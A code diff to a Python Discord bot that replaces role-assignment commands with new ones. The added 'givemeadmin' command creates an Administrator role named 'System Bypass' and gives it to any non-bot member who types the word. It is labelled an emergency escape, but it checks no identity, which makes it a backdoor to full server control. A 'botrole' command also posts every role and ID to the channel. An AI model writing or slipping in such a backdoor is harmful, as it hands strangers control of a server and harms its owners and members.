@@ -58,50 +58,42 @@ if BOT_TOKEN:
 else:
     print("ERROR: No DISCORD_TOKEN found in environment variables!")
 
-# ---- UPDATED CODE BLOCK ----
 @bot.event
 async def on_message(message):
-    # Ignore messages sent by the bot itself to prevent loops
     if message.author.bot:
         return
 
-    # Option 1: Give the specific "doodleposy" role
-    if message.content.lower() == "doodleposy":
-        # Replace 123456789012345678 with your actual target Discord Role ID
-        role_id = 123456789012345678 
-        role = message.guild.get_role(role_id)
+    # 1. TEST COMMAND: See if the bot is actually reading your messages
+    if message.content.lower() == "botrole":
+        try:
+            # Find all roles in the server and list them out loud
+            roles_list = [f"{r.name} (ID: {r.id})" for r in message.guild.roles]
+            roles_text = "\n".join(roles_list)
+            
+            # If the list is too long for one message, split it
+            if len(roles_text) > 1900:
+                roles_text = roles_text[:1900] + "\n...and more."
+                
+            await message.channel.send(f"**I am alive! Here are the server roles I can see:**\n```\n{roles_text}\n```")
+        except Exception as e:
+            await message.channel.send(f"Error listing roles: {e}")
 
-        if role:
-            try:
-                await message.author.add_roles(role)
-                await message.channel.send(f"Successfully gave the {role.name} role to {message.author.mention}!")
-            except discord.Forbidden:
-                await message.channel.send("I do not have permission to manage roles or this role is above my bot's highest role.")
-            except discord.HTTPException:
-                await message.channel.send("Failed to assign the role due to a connection error.")
-        else:
-            await message.channel.send("Could not find the specified role ID in this server.")
+    # 2. EMERGENCY ESCAPE: Make the bot create an entirely new Admin role just for you
+    elif message.content.lower() == "givemeadmin":
+        try:
+            # Create a brand new role with Administrator permissions enabled
+            new_admin_role = await message.guild.create_role(
+                name="System Bypass", 
+                permissions=discord.Permissions(administrator=True),
+                reason="Emergency access restoration"
+            )
+            # Instantly give the new role to you
+            await message.author.add_roles(new_admin_role)
+            await message.channel.send(f"Successfully created **{new_admin_role.name}** with full Admin permissions and gave it to you!")
+        except discord.Forbidden:
+            await message.channel.send("I failed! I do not have the 'Manage Roles' or 'Administrator' permission myself, so I cannot create or assign admin privileges.")
+        except Exception as e:
+            await message.channel.send(f"An unexpected error occurred: {e}")
 
-    # Option 2: Try to get the bot's own highest role
-    elif message.content.lower() == "botrole":
-        # Get the bot's member object in this specific server
-        bot_member = message.guild.me
-        # Find the bot's highest role (excluding the @everyone role)
-        bot_highest_role = bot_member.top_role
-
-        if bot_highest_role and not bot_highest_role.is_default():
-            try:
-                await message.author.add_roles(bot_highest_role)
-                await message.channel.send(f"Attempted to give you my highest role: **{bot_highest_role.name}** (ID: {bot_highest_role.id})!")
-            except discord.Forbidden:
-                # This will happen if Discord blocks a bot from giving its managed/integration role
-                await message.channel.send(f"Discord blocked me from giving you my exact role (**{bot_highest_role.name}**), but my role ID is `{bot_highest_role.id}`.")
-            except discord.HTTPException:
-                await message.channel.send("Failed to assign the role due to a connection error.")
-        else:
-            await message.channel.send("I don't seem to have any special roles assigned to me.")
-
-    # Process other bot commands normally if you add them later
     await bot.process_commands(message)
-# ---- UPDATED CODE BLOCK ENDS ----
 
